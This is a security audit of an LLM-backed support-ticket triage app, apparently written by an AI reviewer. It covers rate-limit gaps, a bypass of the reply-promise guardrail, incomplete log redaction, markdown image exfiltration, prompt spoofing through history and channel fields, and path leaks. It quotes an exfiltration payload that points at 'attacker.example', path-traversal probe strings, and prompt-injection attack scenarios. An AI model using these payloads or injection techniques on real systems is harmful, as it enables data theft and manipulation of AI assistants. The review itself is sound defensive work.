# Security review r1 — 2026-11-17 18:36 (+06) — reviewer: REVIEWER-SEC (Gemini 4 Argon)
Verdict: FIX-BLOCKERS
Threat model:
- **Assets**: LLM API key (`LLM_API_KEY`) and quota/budget (`<= ~100 LLM calls` per eval), knowledge base integrity (`data/kb/*.md`), support ticket triage integrity (`needs_human`, `injection_detected`, `suggested_reply` safety), SQLite triage history (`lumadesk.db`), and support agent browser sessions.
- **Entry points**: FastAPI endpoints (`POST /ask`, `POST /ask/stream`, `POST /triage`, `POST /triage/batch`, `GET /triage/history`, `POST /kb/index`, `GET /kb/documents`, `GET /kb/documents/{doc_id}`, `GET /healthz`, `GET /readyz`), KB markdown ingestion (`data/kb/community-forum-post.md`), sample tickets (`data/tickets/sample_tickets.jsonl`), and Next.js markdown rendering (`MarkdownContent`).
- **Trust boundaries**: Browser (`apps/web` :3000) ↔ FastAPI (`apps/api` :8000) ↔ External OpenAI-compatible LLM (`LLM_BASE_URL`) / Embedded Qdrant (`.qdrant`) / SQLite (`lumadesk.db`) / Untrusted customer tickets & community forum KB post.
- **Actors**: Support agent (legitimate user), malicious customer submitting prompt-injected tickets (e.g., `T-008`, `T-015`), malicious community forum author (`community-forum-post.md`), and unauthenticated local/network API caller.

Automated: secrets scan ✅ · pip-audit ✅ (0 known vulnerabilities) · bandit ✅ (0 high/medium, 1 low `B101`) · npm audit ✅ (0 vulnerabilities)
Hands-on tests: injection ✅ · indirect injection ✅ · exfiltration ❌ · tenant n.a. (single-tenant local copilot) · cost ❌ · SSRF/path-traversal ✅
Counts: BLOCKER 0 · HIGH 3 · MEDIUM 3 · LOW 1

## Summary of Focus Area Verification
- **Secrets handling (`.env`, git history, `NEXT_PUBLIC_*`)**: ✅ `.env` is gitignored and untracked (`git ls-files .env` is empty); no secrets in `e1961f6..HEAD` commit history; `NEXT_PUBLIC_API_URL` is the only client-exposed env var; `Settings.llm_api_key` uses `SecretStr`. However, log redaction in `app/core/logging.py` misses Google AI Studio (`AIza...`) keys and structured `extra` fields (**SEC-3**).
- **Untrusted KB isolation (`data/kb/community-forum-post.md`)**: ✅ `is_untrusted()` flags `community-forum-post.md` (`trusted=False`), and both `VectorStore.search(..., trusted_only=True)` and `VectorStore.trusted_payloads()` exclude untrusted chunks from dense and BM25 lexical retrieval. Acceptance test 7 passes.
- **Direct prompt injection & reply safety (`T-008`, `T-015`)**: ⚠️ `T-008` and `T-015` are accurately flagged (`injection_detected=True`, `needs_human=True`, safe reply). However, `apply_guardrails()` in `app/services/guardrails.py:334` skips `promise_violations()` whenever `needs_human` and `injection` are both `False`, and `/ask` has no output promise check (**SEC-2**).
- **SQL injection (`app/services/history.py`)**: ✅ All SQLite queries use parameterized `?` placeholders (`history.py:51-66, 71-75`) and `DATABASE_URL` is restricted to `sqlite:///`.
- **Path traversal / SSRF (`/kb/documents/{doc_id}`)**: ✅ `DOC_ID_RE` (`^[A-Za-z0-9][A-Za-z0-9._-]{0,99}$`) and allowlist matching against `load_documents()` block `../../.env`, `..%2f..%2fetc%2fpasswd`, and `.md` suffixes with HTTP 404. No user-controlled URL fetching (SSRF) exists in the backend.
- **CORS (`app/main.py`)**: ✅ Restricted to explicit `CORS_ORIGINS` (`http://localhost:3000,http://localhost:3001`), methods `["GET", "POST"]`, headers `["content-type", "x-request-id"]`, and `allow_credentials=False`.
- **XSS / Markdown rendering (`apps/web/src/components/common/markdown-content.tsx`)**: ⚠️ `rehype-sanitize` prevents raw HTML/JS execution (`<script>`, `onerror`, `javascript:` URIs), and custom `rehypeHighlightSnippet` inserts text-only `<mark>` HAST nodes. However, default `rehype-sanitize` allows external `<img>` tags (`![x](https://...)`), enabling data exfiltration / tracking pixels from model output or untrusted KB docs (**SEC-4**).

---

## Findings

### SEC-1 [HIGH] Unthrottled `POST /triage/batch` and LLM routes allow concurrent quota/cost exhaustion — CWE-770 · OWASP API4:2023 / LLM10:2025
File: `apps/api/app/services/triage.py:212-246`, `apps/api/app/api/routes/triage.py:17-20` · Owner: `core-triage` / `LEAD`
Evidence:
`POST /triage/batch` (`apps/api/app/services/triage.py:212-215`) creates a per-request local `asyncio.Semaphore(BATCH_CONCURRENCY)` (`BATCH_CONCURRENCY = 4`) and executes 16 LLM calls, 16 vector searches, and 16 SQLite writes per call. Unlike `index_kb()` (`apps/api/app/services/kb.py:37,264`), which serializes runs with a module-level `_index_lock = asyncio.Lock()`, `triage_batch()` has no process-wide lock, cooldown, or rate limit. Sending 7 concurrent `POST /triage/batch` requests fires 112 LLM calls in parallel, exceeding the entire hackathon budget (`<= ~100 LLM calls` in `TASK.md:42`).
Impact:
Rapid or concurrent requests to `/triage/batch` (or `/triage` and `/ask`) immediately exhaust the LLM API key's rate limit and quota, causing 503 `upstream_unavailable` failures across the application.
Fix:
Guard `triage_batch()` with a module-level lock (or fail fast with HTTP 429 when a batch is already running) and bound process-wide concurrent LLM calls in `apps/api/app/services/triage.py`:
```python
_batch_lock = asyncio.Lock()

async def triage_batch() -> BatchTriageResult:
    if _batch_lock.locked():
        raise AppError("batch_in_progress", "A batch triage run is already in progress. Please wait.", 429)
    async with _batch_lock:
        started = time.perf_counter()
        ...
```

---

### SEC-2 [HIGH] Reply promise guardrail (`promise_violations`) is bypassed when `needs_human` and `injection` are `False` — CWE-693 · OWASP LLM01:2025 / LLM05:2025
File: `apps/api/app/services/guardrails.py:120-124, 171-193, 334-339` · Owner: `core-triage`
Evidence:
1. In `apps/api/app/services/guardrails.py:334-339`, `promise_violations(cleaned)` is only checked inside `elif needs_human or injection:`.
2. In `apps/api/app/services/guardrails.py:122-123`, `_ACTION_RULES` for `"refund / compensation"` checks `\brefund|\breimburs|\bcompensat|\bmoney back\b` but omits `\bcredit\b|ক্রেডিট`.
Running:
```python
apply_guardrails(
    text="My bill was 1800 BDT instead of 1200 BDT, please give me 5 days of credit",
    language=Language.en,
    category=Category.billing,
    urgency=Urgency.medium,
    injection_suspected=False,
    reply="We will refund 600 BDT to your account and your 5 days of credit has been approved.",
    evidence="",
    n_citations=0,
)
```
returns `needs_human=False`, `injection_detected=False`, and `reply="We will refund 600 BDT to your account and your 5 days of credit has been approved."` unmodified.
Impact:
If a prompt injection evades the regex list in `_INJECTION_RULES` and the LLM does not set `injection_suspected=True` (or on any billing/outage ticket where `needs_human` evaluates to `False`), the assistant can promise a refund, credit, or payout directly to the customer without triggering replacement or human review.
Fix:
In `apps/api/app/services/guardrails.py`, check explicit refund/credit/compensation promise rules (`_PROMISE_RULES[1:]`) on **every** reply regardless of `needs_human` (keeping the generic bare-word `_rx(r"\bapproved\b")` rule gated on `needs_human or injection` so `test_promise_check_skipped_when_no_human_needed` continues to pass), and set `needs_human = True` + replace with `safe_reply(language)` when matched:
```python
    elif needs_human or injection:
        bad = promise_violations(cleaned)
        if bad:
            reasons.append("Reply promised a refund/credit/approval (" + ", ".join(bad[:3]) + "): replaced")
            cleaned = safe_reply(language)
    else:
        bad = [
            m.group(0).strip()
            for rx in _PROMISE_RULES[1:]
            for m in rx.finditer(_normalize(cleaned))
            if not _NEGATION.search(_normalize(cleaned)[max(0, m.start() - 24) : m.start()])
        ]
        if bad:
            needs_human = True
            reasons.append("Reply promised a refund/credit/approval (" + ", ".join(bad[:3]) + "): replaced")
            cleaned = safe_reply(language)
```

---

### SEC-3 [HIGH] Log redaction misses Google AI Studio (`AIza...`) keys and skips structured `extra` fields — CWE-532 · OWASP A09:2021 / LLM02:2025
File: `apps/api/app/core/logging.py:11-32` · Owner: `LEAD`
Evidence:
1. `_SECRET_RE` at `apps/api/app/core/logging.py:11` only matches `r"(sk-[A-Za-z0-9_\-]{8,}|Bearer\s+[A-Za-z0-9._\-]+)"`, missing Google AI Studio keys (`AIza[0-9A-Za-z_\-]{35}`) used by this project (`.orca-team/CREDENTIALS.md:9`) as well as Groq (`gsk_...`) and GitHub (`ghp_...`) tokens.
2. In `JsonFormatter.format()` (`apps/api/app/core/logging.py:27-32`), `extra = getattr(record, "data", None)` is merged into `payload` via `payload.update(extra)` without calling `redact()`.
Hands-on test with `JsonFormatter().format(rec)` produced:
`{"ts": "...", "level": "INFO", "logger": "test", "msg": "key=AIzaSyD1234567890abcdefghijklmnopqrstuvw", "request_id": "-", "leak": "sk-proj-1234567890abcdefghijklmnop"}`
Impact:
Secrets matching `AIza...` in exception tracebacks or any secret passed via `log_event(..., **data)` are logged in cleartext to stdout. Additionally, `extra` keys can overwrite reserved fields (`msg`, `level`, `request_id`).
Fix:
In `apps/api/app/core/logging.py`, expand `_SECRET_RE` and apply `redact()` to the serialized JSON payload:
```python
_SECRET_RE = re.compile(
    r"(sk-[A-Za-z0-9_\-]{8,}|AIza[0-9A-Za-z_\-]{20,}|gsk_[A-Za-z0-9_\-]{20,}"
    r"|ghp_[A-Za-z0-9]{20,}|AKIA[0-9A-Z]{16}|Bearer\s+[A-Za-z0-9._\-]+)"
)
```
And in `JsonFormatter.format`:
```python
        extra = getattr(record, "data", None)
        if isinstance(extra, dict):
            for k, v in extra.items():
                if k not in payload:
                    payload[k] = v
        if record.exc_info:
            payload["exc"] = redact(self.formatException(record.exc_info))
        return redact(json.dumps(payload, ensure_ascii=False, default=str))
```

---

### SEC-4 [MEDIUM] Markdown renderer allows external `<img>` loads enabling exfiltration via model output or untrusted KB docs — CWE-200 · OWASP LLM02:2025 / LLM05:2025
File: `apps/web/src/components/common/markdown-content.tsx:250-306`, `apps/web/next.config.ts:7-15` · Owner: `ui-web`
Evidence:
`MarkdownContent` uses `rehypeSanitize` with its default schema (`apps/web/src/components/common/markdown-content.tsx:253-255`), which permits `<img>` tags with external `https://` / `http://` `src` attributes, and `components` (`lines 258-296`) only overrides `a`. `MarkdownContent` renders streaming LLM output (`ask-workspace.tsx:483`), triage suggested replies (`triage-workspace.tsx:472`), and full KB documents (`doc-drawer.tsx:157`, including `community-forum-post.md` when inspected on `/kb`).
Impact:
If prompt injection causes the model to output `![x](https://attacker.example/leak?q=<context>)` or an agent inspects an untrusted document containing a markdown image, the browser automatically fetches the external URL, leaking conversation data and agent IP/metadata.
Fix:
Block external images in `apps/web/src/components/common/markdown-content.tsx` by adding `img: () => null` to the `components` map (lines 258-296), and add `Content-Security-Policy: default-src 'self'; img-src 'self' data: blob:; connect-src 'self' http://localhost:* https://localhost:*; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'` in `apps/web/next.config.ts`.

---

### SEC-5 [MEDIUM] Untrusted multi-turn `history` in `/ask` and `channel` in `/triage` allow prompt structure spoofing — CWE-77 · OWASP LLM01:2025
File: `apps/api/app/prompts/ask_prompt.py:53-58, 74-90`, `apps/api/app/prompts/triage_prompt.py:73-79` · Owner: `core-kb` / `core-triage`
Evidence:
1. In `apps/api/app/prompts/ask_prompt.py:78-79`, client-supplied `history` turns with `role="assistant"` are appended directly as native `{"role": "assistant", "content": ...}` LLM messages without delimiter tags, while `_CLOSING_TAG_RE` (`line 53`) only strips `</sources>` and `</question>`.
2. In `apps/api/app/prompts/triage_prompt.py:75`, `req.channel` (`Channel: {channel[:32]}`) is interpolated into the prompt outside the `<<<TICKET_{nonce}>>>` boundary without stripping newlines or restricting `channel` to allowed values.
Impact:
A malicious caller can pass fabricated `assistant` turns in `AskRequest.history` to prime the LLM into ignoring policy rules, or inject newline-delimited instructions via `TriageRequest.channel`.
Fix:
1. In `apps/api/app/prompts/triage_prompt.py:75`, sanitize `channel` (`re.sub(r"[^a-zA-Z0-9_-]", "", channel)[:16] or "chat"`).
2. In `apps/api/app/prompts/ask_prompt.py:78-79`, prefix or wrap `history` content so client-supplied `assistant` turns cannot impersonate system instructions or policy overrides.

---

### SEC-6 [MEDIUM] `VectorStoreLockedError` and `get_embedder` leak internal server filesystem paths and env configuration — CWE-209 · OWASP A05:2021
File: `apps/api/app/adapters/vectorstore.py:53-59`, `apps/api/app/adapters/embeddings.py:80-85` · Owner: `core-kb` / `LEAD`
Evidence:
`VectorStoreLockedError` (`apps/api/app/adapters/vectorstore.py:56`) interpolates the resolved absolute filesystem path (`s.resolve(s.qdrant_path)`, e.g. `C:\Users\MSI\orca\workspaces\...\apps\api\.qdrant`) into `AppError.message`, which `install_error_handlers` (`apps/api/app/core/errors.py:34-37`) returns directly in the HTTP 503 JSON response. Similarly, `get_embedder()` (`apps/api/app/adapters/embeddings.py:83`) returns `f"EMBEDDING_PROVIDER={settings.embedding_provider!r} is not supported; use 'local'."` to the client.
Impact:
Leaks internal server directory structure, OS username, and environment configuration to API clients on 503 errors.
Fix:
Log the resolved path and provider name server-side via `log_event`, and return a generic client-facing message in `VectorStoreLockedError`:
```python
class VectorStoreLockedError(AppError):
    def __init__(self, path: str) -> None:
        log.warning("vectorstore_locked", extra={"data": {"path": path}})
        super().__init__(
            "kb_locked",
            "The vector store is currently in use by another process. "
            "Stop it and retry, or call POST /kb/index on the running API instead.",
            503,
        )
```

---

### SEC-7 [LOW] Whitespace-only tickets pollute SQLite history, `_DDL` executes on every read connection, and `assert` guards `LLMClient._create` — CWE-20 / CWE-703 · OWASP API4:2023
File: `apps/api/app/services/triage.py:136-155`, `apps/api/app/services/history.py:41-46`, `apps/api/app/adapters/llm.py:84` · Owner: `core-triage` / `LEAD`
Evidence:
1. `POST /triage` with `{"text": "   "}` passes Pydantic `min_length=1` and calls `await history_store.save(result)` (`triage.py:154`), writing an `"Empty ticket"` row to SQLite on every call.
2. `history._connect()` (`history.py:45`) runs `conn.executescript(_DDL)` on every read (`_list_sync`) as well as write (`_save_sync`), acquiring schema locks unnecessarily on `GET /triage/history`.
3. Bandit `B101` flagged `assert self._client is not None` at `apps/api/app/adapters/llm.py:84` (stripped when Python runs with `-O`).
Impact:
Trivial database table pollution with empty tickets, unnecessary SQLite lock contention under concurrent reads/writes, and potential `AttributeError` instead of `UpstreamError` if run under `python -O`.
Fix:
Skip `await history_store.save(result)` for whitespace-only tickets in `apps/api/app/services/triage.py:154` (or only run `conn.executescript(_DDL)` in `_save_sync` / once per db path), and replace `assert self._client is not None` with `if self._client is None: raise UpstreamError()` in `apps/api/app/adapters/llm.py:84`.
